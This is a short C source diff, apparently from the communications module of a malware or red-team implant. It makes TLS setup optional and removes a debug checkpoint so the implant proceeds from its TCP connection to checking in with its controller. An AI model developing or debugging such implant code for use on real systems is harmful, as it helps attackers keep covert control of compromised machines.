@@ -461,6 +461,10 @@ NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) {
 
     COMMS_API *api = &ctx->api;
 
+    /* TLS init is optional — skip if SChannel APIs weren't resolved */
+    if (!api->tls_available)
+        return STATUS_SUCCESS;
+
     SCHANNEL_CRED cred;
     spec_memset(&cred, 0, sizeof(cred));
     cred.dwVersion = SCHANNEL_CRED_VERSION;
@@ -1696,8 +1700,7 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
 
-    /* Checkpoint: connected, about to checkin */
-    return (NTSTATUS)0xC0000176; /* 176 = TCP connected */
+    /* Checkpoint removed — proceed to checkin */
 
     /* TLS handshake — only for channels with https:// scheme */
     if (ch->needs_tls && g_comms_ctx.api.tls_available) {
